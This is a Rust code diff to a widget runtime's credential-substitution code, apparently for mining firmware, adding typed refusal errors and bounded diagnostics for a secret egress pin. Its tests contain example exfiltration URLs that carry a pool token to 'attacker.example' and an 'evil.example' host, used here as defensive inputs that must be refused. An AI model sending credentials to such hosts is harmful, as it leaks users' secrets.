@@ -111,7 +111,7 @@ fn push_str(out: &mut Vec<u8>, s: &str) {
 /// Why a template could not be resolved.
 /// Every variant names the offending text,
 /// because the widget author is the one who has to fix it.
-#[derive(Debug, PartialEq, Eq, thiserror::Error)]
+#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
 pub enum SubstitutionError {
     /// Deliberately silent on why. The host is handed the resolved secrets
     /// and cannot see whether a slot arrived empty because nothing was bound,
@@ -127,6 +127,62 @@ pub enum SubstitutionError {
     UnknownVariable { name: String },
     #[error("unterminated {{{{ … }}}} in the request")]
     Unterminated,
+}
+
+const MAX_REFUSAL_TEXT_BYTES: usize = bmc_widget_manifest::MAX_PARAM_KEY_LENGTH;
+
+fn bounded_refusal_text(text: &str) -> String {
+    let mut end = text.len().min(MAX_REFUSAL_TEXT_BYTES);
+    while !text.is_char_boundary(end) {
+        end -= 1;
+    }
+    text.get(..end)
+        .expect("BUG: bounded refusal text ends on a UTF-8 boundary")
+        .to_owned()
+}
+
+impl SubstitutionError {
+    fn bounded(self) -> Self {
+        match self {
+            Self::NoSecretForSlot { slot } => Self::NoSecretForSlot {
+                slot: bounded_refusal_text(&slot),
+            },
+            Self::UnknownField { slot, field } => Self::UnknownField {
+                slot: bounded_refusal_text(&slot),
+                field: bounded_refusal_text(&field),
+            },
+            Self::UnknownVariable { name } => Self::UnknownVariable {
+                name: bounded_refusal_text(&name),
+            },
+            Self::Unterminated => Self::Unterminated,
+        }
+    }
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
+pub(crate) enum CredentialRefusal {
+    #[error("credential placeholder unresolved err={0}")]
+    Substitution(SubstitutionError),
+    #[error("destination is not a parsable URL")]
+    DestinationNotUrl,
+    #[error("destination has no host to check against the egress pin")]
+    DestinationWithoutHost,
+    #[error("the client cannot parse the destination")]
+    ClientDestinationNotUrl,
+    #[error("the pin and the client disagree on the host")]
+    ClientHostMismatch,
+    #[error("secret held for a slot of unknown type slot={slot:?}")]
+    SecretSlotUnknownType { slot: String },
+    #[error("unknown credential type slot={slot:?} type_id={type_id:?}")]
+    UnknownCredentialType { slot: String, type_id: String },
+    #[error("destination is outside the credential's egress pin slot={slot:?} type_id={type_id:?}")]
+    OutsideEgressPin { slot: String, type_id: String },
+}
+
+impl From<SubstitutionError> for CredentialRefusal {
+    fn from(error: SubstitutionError) -> Self {
+        Self::Substitution(error.bounded())
+    }
 }
 
 /// Replace every `{{ credential.<slot>.<field> }}` with the bound secret.
@@ -212,7 +268,7 @@ pub(in crate::runtime) struct SpentRequest {
 
 /// Substitute the widget's credential placeholders into one outbound request.
 ///
-/// Returns `None` when the request must not go out:
+/// Returns an error when the request must not go out:
 /// a placeholder could not be resolved,
 /// or the destination lies outside the egress pin
 /// of a type whose secret the request spends.
@@ -229,7 +285,7 @@ pub(in crate::runtime) fn spend(
     url: &str,
     headers: &[(String, String)],
     body: Option<Vec<u8>>,
-) -> Option<SpentRequest> {
+) -> Result<SpentRequest, CredentialRefusal> {
     // Base-URL rewrite (`RuntimeConfig::url_rewrites`): applied ahead of
     // substitution and the egress check, so the pin judges the destination
     // actually dialed. Everything upstream — the fetch key, interceptor,
@@ -237,60 +293,55 @@ pub(in crate::runtime) fn spend(
     let url = rewrite_origin(url, &state.url_rewrites).unwrap_or_else(|| url.to_owned());
     let url = url.as_str();
 
-    let secrets = &state.credential_secrets;
-    let spent = slots_referenced(url, headers, body.as_deref());
-    if spent.is_empty() {
-        return Some(SpentRequest {
-            url: url.to_owned(),
-            headers: headers.to_vec(),
-            body,
-            carries_secret: false,
-        });
-    }
-
-    let resolve = |text: &str| match substitute(text, secrets) {
-        Ok(resolved) => Some(resolved),
-        Err(err) => {
-            tracing::warn!(%err, "refusing fetch: credential placeholder unresolved");
-            None
+    let result = (|| {
+        let secrets = &state.credential_secrets;
+        let spent = slots_referenced(url, headers, body.as_deref());
+        if spent.is_empty() {
+            return Ok(SpentRequest {
+                url: url.to_owned(),
+                headers: headers.to_vec(),
+                body,
+                carries_secret: false,
+            });
         }
-    };
 
-    // Substitute first: the pin must judge the URL that will be dialled.
-    // A secret is inserted verbatim, so one containing `/` ends the authority
-    // early and slides the approved host into the path.
-    let url = resolve(url)?;
-    // Never logged with the URL: it now carries the secret.
-    let Ok(destination) = url::Url::parse(&url) else {
-        tracing::warn!("refusing fetch: destination is not a parsable URL");
-        return None;
-    };
-    if !egress_permitted(state, &destination, &spent) {
-        return None;
-    }
-    if !client_reads_the_same_host(&destination, &url) {
-        return None;
-    }
-    let headers = headers
-        .iter()
-        .map(|(name, value)| Some((resolve(name)?, resolve(value)?)))
-        .collect::<Option<Vec<_>>>()?;
-    let body = match body {
-        // A non-UTF-8 body cannot carry a textual placeholder,
-        // so it passes through rather than failing the request.
-        Some(bytes) => Some(match String::from_utf8(bytes) {
-            Ok(text) => resolve(&text)?.into_bytes(),
-            Err(raw) => raw.into_bytes(),
-        }),
-        None => None,
-    };
+        let resolve = |text: &str| substitute(text, secrets).map_err(CredentialRefusal::from);
 
-    Some(SpentRequest {
-        url,
-        headers,
-        body,
-        carries_secret: true,
-    })
+        // Substitute first: the pin must judge the URL that will be dialled.
+        // A secret is inserted verbatim, so one containing `/` ends the authority
+        // early and slides the approved host into the path.
+        let url = resolve(url)?;
+        // Never logged with the URL: it now carries the secret.
+        let destination =
+            url::Url::parse(&url).map_err(|_| CredentialRefusal::DestinationNotUrl)?;
+        egress_permitted(state, &destination, &spent)?;
+        client_reads_the_same_host(&destination, &url)?;
+        let headers = headers
+            .iter()
+            .map(|(name, value)| Ok((resolve(name)?, resolve(value)?)))
+            .collect::<Result<Vec<_>, CredentialRefusal>>()?;
+        let body = match body {
+            // A non-UTF-8 body cannot carry a textual placeholder,
+            // so it passes through rather than failing the request.
+            Some(bytes) => Some(match String::from_utf8(bytes) {
+                Ok(text) => resolve(&text)?.into_bytes(),
+                Err(raw) => raw.into_bytes(),
+            }),
+            None => None,
+        };
+
+        Ok(SpentRequest {
+            url,
+            headers,
+            body,
+            carries_secret: true,
+        })
+    })();
+
+    if let Err(refusal) = &result {
+        tracing::warn!("refusing fetch: {refusal}");
+    }
+    result
 }
 
 /// `url` with the origin a rewrite names swapped for its replacement,
@@ -331,11 +382,10 @@ fn after_authority(url: &str) -> Option<&str> {
 ///
 /// Hosts only: `http::Uri` does not model a scheme's default port,
 /// and a port divergence on an agreed host reaches no other server.
-fn client_reads_the_same_host(destination: &url::Url, sent: &str) -> bool {
-    let Ok(uri) = sent.parse::<ureq::http::Uri>() else {
-        tracing::warn!("refusing fetch: the client cannot parse the destination");
-        return false;
-    };
+fn client_reads_the_same_host(destination: &url::Url, sent: &str) -> Result<(), CredentialRefusal> {
+    let uri = sent
+        .parse::<ureq::http::Uri>()
+        .map_err(|_| CredentialRefusal::ClientDestinationNotUrl)?;
     // `authority_of` renders IPv6 bare, `http::Uri` keeps the brackets.
     let client_host = uri
         .host()
@@ -343,10 +393,9 @@ fn client_reads_the_same_host(destination: &url::Url, sent: &str) -> bool {
     let approved = authority_of(destination).map(|(host, _)| host);
 
     if client_host != approved.as_deref() {
-        tracing::warn!("refusing fetch: the pin and the client disagree on the host");
-        return false;
+        return Err(CredentialRefusal::ClientHostMismatch);
     }
-    true
+    Ok(())
 }
 
 /// Credential slots the request refers to, by scanning for their placeholders.
@@ -395,14 +444,15 @@ fn slots_referenced(url: &str, headers: &[(String, String)], body: Option<&[u8]>
 /// An account carrying its own `allow_hosts` is pinned by that list alone;
 /// without one, its credential type decides from the firmware catalog.
 /// Nothing the *guest* says moves the pin either way.
-fn egress_permitted(state: &HostState, url: &url::Url, spent: &[String]) -> bool {
-    let Some((host, port)) = authority_of(url) else {
-        tracing::warn!("refusing fetch: destination has no host to check against the egress pin");
-        return false;
-    };
+fn egress_permitted(
+    state: &HostState,
+    url: &url::Url,
+    spent: &[String],
+) -> Result<(), CredentialRefusal> {
+    let (host, port) = authority_of(url).ok_or(CredentialRefusal::DestinationWithoutHost)?;
     let view = state.credentials.snapshot();
 
-    spent.iter().all(|slot| {
+    for slot in spent {
         let Some(type_id) = view.type_of(slot) else {
             // The view and the secrets travel as a pair,
             // but the widget process coalesces them separately,
@@ -411,22 +461,22 @@ fn egress_permitted(state: &HostState, url: &url::Url, spent: &[String]) -> bool
             // A secret whose type cannot be named has no known
             // destination, so it has none: refuse rather than assume.
             if state.credential_secrets.has_slot(slot) {
-                tracing::warn!(
-                    slot,
-                    "refusing fetch: secret held for a slot of unknown type"
-                );
-                return false;
+                return Err(CredentialRefusal::SecretSlotUnknownType {
+                    slot: bounded_refusal_text(slot),
+                });
             }
             // Genuinely unbound, so substitution is about to fail anyway.
             // Letting it report names the slot instead of blaming the host.
-            return true;
+            continue;
         };
         let Some(builtin) = bmc_widget_manifest::credential::BuiltinType::from_id(type_id) else {
             // A type this firmware does not know has an unknowable policy,
             // and unknowable is not the same as absent.
             // `secrets.json` is hand-editable, which is all it takes to get here.
-            tracing::warn!(slot, type_id, "refusing fetch: unknown credential type");
-            return false;
+            return Err(CredentialRefusal::UnknownCredentialType {
+                slot: bounded_refusal_text(slot),
+                type_id: bounded_refusal_text(type_id),
+            });
         };
         let account_hosts = state.credential_secrets.allow_hosts(slot);
         let permitted = if account_hosts.is_empty() {
@@ -438,16 +488,13 @@ fn egress_permitted(state: &HostState, url: &url::Url, spent: &[String]) -> bool
             policy.allows(&host, port)
         };
         if !permitted {
-            // Unnamed on purpose: the host comes from the substituted URL,
-            // so a reshaped authority would put the secret in the log.
-            tracing::warn!(
-                slot,
-                type_id,
-                "refusing fetch: destination is outside the credential's egress pin"
-            );
+            return Err(CredentialRefusal::OutsideEgressPin {
+                slot: bounded_refusal_text(slot),
+                type_id: bounded_refusal_text(type_id),
+            });
         }
-        permitted
-    })
+    }
+    Ok(())
 }
 
 /// Host and effective port of a parsed URL.
@@ -602,15 +649,25 @@ mod tests {
     fn a_destination_outside_the_pin_gets_no_request_at_all() {
         let state = host_state_with(BuiltinType::BraiinsPool.id());
 
+        let refusal = spend(
+            &state,
+            "https://attacker.example/?t={{ credential.pool.token }}",
+            &[],
+            None,
+        )
+        .err()
+        .expect("the destination is outside the credential pin");
+        assert_eq!(
+            refusal,
+            CredentialRefusal::OutsideEgressPin {
+                slot: "pool".to_owned(),
+                type_id: BuiltinType::BraiinsPool.id().to_owned(),
+            },
+            "refusing outright beats sending the placeholder to an unpinned host",
+        );
         assert!(
-            spend(
-                &state,
-                "https://attacker.example/?t={{ credential.pool.token }}",
-                &[],
-                None,
-            )
-            .is_none(),
-            "refusing outright beats sending the placeholder to an unpinned host"
+            !refusal.to_string().contains("attacker.example"),
+            "the substituted destination must not enter the diagnostic",
         );
     }
 
@@ -641,7 +698,7 @@ mod tests {
                 &[],
                 None,
             )
-            .is_some(),
+            .is_ok(),
             "the listed host must stay reachable"
         );
         assert!(
@@ -651,7 +708,7 @@ mod tests {
                 &[],
                 None,
             )
-            .is_none(),
+            .is_err(),
             "an account pin must bite where the type alone would not"
         );
     }
@@ -670,7 +727,7 @@ mod tests {
                 &[],
                 None,
             )
-            .is_some(),
+            .is_ok(),
         );
         assert!(
             spend(
@@ -679,7 +736,7 @@ mod tests {
                 &[],
                 None,
             )
-            .is_none(),
+            .is_err(),
             "replacement, not union: the type's host is no longer pinned in"
         );
     }
@@ -708,7 +765,7 @@ mod tests {
                 &[],
                 None,
             )
-            .is_none(),
+            .is_err(),
             "an unrewritten host is judged as itself and refused by the pin"
         );
     }
@@ -770,7 +827,7 @@ mod tests {
             let url = format!("{host}?t={{{{ credential.pool.token }}}}");
 
             assert_eq!(
-                spend(&state, &url, &[], None).is_some(),
+                spend(&state, &url, &[], None).is_ok(),
                 permitted,
                 "pin {pin} against {host}"
             );
@@ -826,7 +883,7 @@ mod tests {
                 &[],
                 None
             )
-            .is_none(),
+            .is_err(),
             "the pinned slot has to refuse the whole request, not just its own value"
         );
         assert!(
@@ -836,7 +893,7 @@ mod tests {
                 &[],
                 None
             )
-            .is_some(),
+            .is_ok(),
             "a destination both slots admit must still go out"
         );
     }
@@ -867,7 +924,7 @@ mod tests {
             "https://{{credential.pool.token}}.evil.example/x",
         ] {
             assert!(
-                spend(&state, url, &[], None).is_none(),
+                spend(&state, url, &[], None).is_err(),
                 "a pinned secret escaped through the host position: {url}"
             );
         }
@@ -879,15 +936,19 @@ mod tests {
         // and it must not read as "this type has no pin".
         let state = host_state_with("braiins-pool-but-renamed");
 
-        assert!(
+        assert_eq!(
             spend(
                 &state,
                 "https://attacker.example/?t={{ credential.pool.token }}",
                 &[],
                 None,
             )
-            .is_none(),
-            "an unknowable policy is not an absent one"
+            .err(),
+            Some(CredentialRefusal::UnknownCredentialType {
+                slot: "pool".to_owned(),
+                type_id: "braiins-pool-but-renamed".to_owned(),
+            }),
+            "an unknowable policy is not an absent one",
         );
     }
 
@@ -898,15 +959,18 @@ mod tests {
         let mut state = host_state_with(BuiltinType::BraiinsPool.id());
         state.credentials.replace(CredentialView::default());
 
-        assert!(
+        assert_eq!(
             spend(
                 &state,
                 "https://attacker.example/?t={{ credential.pool.token }}",
                 &[],
                 None,
             )
-            .is_none(),
-            "an unclassifiable secret has no known destination, so it has none"
+            .err(),
+            Some(CredentialRefusal::SecretSlotUnknownType {
+                slot: "pool".to_owned(),
+            }),
+            "an unclassifiable secret has no known destination, so it has none",
         );
     }
 
@@ -925,15 +989,48 @@ mod tests {
     fn an_unresolvable_placeholder_stops_the_request() {
         let state = host_state_with(BuiltinType::BraiinsPool.id());
 
-        assert!(
+        assert_eq!(
             spend(
                 &state,
                 "https://api.braiins.com/?t={{ credential.pool.tokne }}",
                 &[],
                 None,
             )
-            .is_none(),
-            "a typo must fail loudly, not send a half-built request"
+            .err(),
+            Some(CredentialRefusal::Substitution(
+                SubstitutionError::UnknownField {
+                    slot: "pool".to_owned(),
+                    field: "tokne".to_owned(),
+                },
+            )),
+            "a typo must fail loudly, not send a half-built request",
+        );
+    }
+
+    #[test]
+    fn an_unparsable_resolved_destination_is_typed() {
+        let mut state = host_state_with(BuiltinType::GenericToken.id());
+        state.credential_secrets = secrets_with_token("not a URL");
+
+        assert_eq!(
+            spend(&state, "{{ credential.pool.token }}", &[], None).err(),
+            Some(CredentialRefusal::DestinationNotUrl),
+        );
+    }
+
+    #[test]
+    fn a_resolved_destination_without_a_host_is_typed() {
+        let state = host_state_with(BuiltinType::GenericToken.id());
+
+        assert_eq!(
+            spend(
+                &state,
+                "data:text/plain,{{ credential.pool.token }}",
+                &[],
+                None,
+            )
+            .err(),
+            Some(CredentialRefusal::DestinationWithoutHost),
         );
     }
 
@@ -953,19 +1050,29 @@ mod tests {
     #[test]
     fn a_secret_that_reshapes_the_authority_is_refused() {
         let mut state = host_state_with(BuiltinType::BraiinsPool.id());
-        // Base64 tokens contain `/`, and the value goes in verbatim,
-        // so this resolves to `https://ab/cd@api.braiins.com/x` — authority `ab`.
-        state.credential_secrets = secrets_with_token("ab/cd");
+        // A credential value containing `/` goes in verbatim,
+        // moving the approved host into the path.
+        state.credential_secrets = secrets_with_token("secret-host.invalid/path");
 
+        let refusal = spend(
+            &state,
+            "https://{{ credential.pool.token }}@api.braiins.com/x",
+            &[],
+            None,
+        )
+        .err()
+        .expect("the resolved authority is outside the credential pin");
+        assert_eq!(
+            refusal,
+            CredentialRefusal::OutsideEgressPin {
+                slot: "pool".to_owned(),
+                type_id: BuiltinType::BraiinsPool.id().to_owned(),
+            },
+            "the pin must judge the dialled URL, not the template it grew from",
+        );
         assert!(
-            spend(
-                &state,
-                "https://{{ credential.pool.token }}@api.braiins.com/x",
-                &[],
-                None,
-            )
-            .is_none(),
-            "the pin must judge the dialled URL, not the template it grew from"
+            !refusal.to_string().contains("secret-host.invalid"),
+            "neither the secret nor its derived host may enter the diagnostic",
         );
     }
 
@@ -991,13 +1098,24 @@ mod tests {
     fn a_host_the_client_reads_differently_is_refused() {
         let approved = url::Url::parse("https://api.braiins.com/x").expect("BUG: must parse");
 
-        assert!(client_reads_the_same_host(
-            &approved,
-            "https://api.braiins.com/x"
-        ));
-        assert!(
-            !client_reads_the_same_host(&approved, "https://evil.example/x"),
-            "where the two parsers disagree on the host, that disagreement is the hole"
+        assert_eq!(
+            client_reads_the_same_host(&approved, "https://api.braiins.com/x"),
+            Ok(()),
+        );
+        assert_eq!(
+            client_reads_the_same_host(&approved, "https://evil.example/x"),
+            Err(CredentialRefusal::ClientHostMismatch),
+            "where the two parsers disagree on the host, that disagreement is the hole",
+        );
+    }
+
+    #[test]
+    fn a_destination_the_client_cannot_parse_is_typed() {
+        let parsed = url::Url::parse("https://api.braiins.com/a b").expect("BUG: URL must parse");
+
+        assert_eq!(
+            client_reads_the_same_host(&parsed, "https://api.braiins.com/a b"),
+            Err(CredentialRefusal::ClientDestinationNotUrl),
         );
     }
 
@@ -1221,6 +1339,106 @@ mod tests {
         let err = substitute("https://x/?t={{ credential.pool.token", &pool_secrets());
 
         assert_eq!(err, Err(SubstitutionError::Unterminated));
+    }
+
+    #[test]
+    fn substitution_refusal_identifiers_are_utf8_safely_bounded() {
+        let retained = "a".repeat(MAX_REFUSAL_TEXT_BYTES - 1);
+        let first = format!("{retained}é-first");
+        let second = format!("{retained}é-second");
+
+        for (first_error, second_error, expected) in [
+            (
+                SubstitutionError::NoSecretForSlot {
+                    slot: first.clone(),
+                },
+                SubstitutionError::NoSecretForSlot {
+                    slot: second.clone(),
+                },
+                SubstitutionError::NoSecretForSlot {
+                    slot: retained.clone(),
+                },
+            ),
+            (
+                SubstitutionError::UnknownField {
+                    slot: "pool".to_owned(),
+                    field: first.clone(),
+                },
+                SubstitutionError::UnknownField {
+                    slot: "pool".to_owned(),
+                    field: second.clone(),
+                },
+                SubstitutionError::UnknownField {
+                    slot: "pool".to_owned(),
+                    field: retained.clone(),
+                },
+            ),
+            (
+                SubstitutionError::UnknownVariable {
+                    name: first.clone(),
+                },
+                SubstitutionError::UnknownVariable {
+                    name: second.clone(),
+                },
+                SubstitutionError::UnknownVariable {
+                    name: retained.clone(),
+                },
+            ),
+        ] {
+            let first_refusal = CredentialRefusal::from(first_error);
+            let second_refusal = CredentialRefusal::from(second_error);
+
+            assert_eq!(
+                first_refusal,
+                CredentialRefusal::Substitution(expected),
+                "the retained text must end before a split UTF-8 codepoint",
+            );
+            assert_eq!(
+                first_refusal, second_refusal,
+                "text beyond the diagnostic cap must not distinguish failures",
+            );
+        }
+    }
+
+    #[test]
+    fn unknown_type_diagnostics_are_utf8_safely_bounded() {
+        let retained = "t".repeat(MAX_REFUSAL_TEXT_BYTES - 1);
+        let type_id = format!("{retained}é-hidden");
+        let state = host_state_with(&type_id);
+
+        assert_eq!(
+            spend(
+                &state,
+                "https://api.example/?t={{ credential.pool.token }}",
+                &[],
+                None,
+            )
+            .err(),
+            Some(CredentialRefusal::UnknownCredentialType {
+                slot: "pool".to_owned(),
+                type_id: retained,
+            }),
+        );
+    }
+
+    #[test]
+    fn refusal_display_preserves_operator_diagnostics() {
+        let no_secret = CredentialRefusal::from(SubstitutionError::NoSecretForSlot {
+            slot: "weather".to_owned(),
+        });
+        assert_eq!(
+            no_secret.to_string(),
+            "credential placeholder unresolved err=no secret available for credential slot \"weather\"",
+        );
+
+        let outside_pin = CredentialRefusal::OutsideEgressPin {
+            slot: "pool".to_owned(),
+            type_id: BuiltinType::BraiinsPool.id().to_owned(),
+        };
+        assert_eq!(
+            outside_pin.to_string(),
+            "destination is outside the credential's egress pin slot=\"pool\" type_id=\"braiins-pool\"",
+        );
     }
 
     /// The claim the whole feature rests on: a host holding live secrets
